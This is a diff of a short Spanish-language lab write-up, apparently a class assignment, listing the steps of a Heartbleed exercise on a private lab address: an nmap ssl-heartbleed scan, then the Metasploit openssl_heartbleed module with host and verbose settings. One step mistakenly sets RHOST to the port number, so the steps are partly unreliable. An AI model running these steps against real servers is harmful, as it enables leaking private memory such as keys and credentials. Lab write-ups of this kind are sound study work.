@@ -6,22 +6,18 @@ atacarla
 
 3.- en mi maquina kali linux use el siguiente comando
 nmap -p 8443 --script ssl-heartbleed 10.0.2.4
-esto para identificar el servicio vulnerable
 
-4.- abri metasploit (msfconsole)
+4.- abri (msfconsole)
 
 5.- use lo siguiente "auxiliary/scanner/ssl/openssl_heartbleed
 
-6.- defini el el host al que atacaria "set RHOST 10.0.2.4"
+6.- defini el el host que atacaria "set RHOST 10.0.2.4"
 
 7.- ahora el puerto "set RHOST 8443"
 
 8.- se definir lo siguiente "set verbose true"
 
 9.- y por ultimo corremos el exploit con "exploit"
-
-esto nos arrojara mucho texto en pantalla, y ya para terminar probe los comandos
-que se mencionaran en la tarea
 
 timedatectl
 uname -a
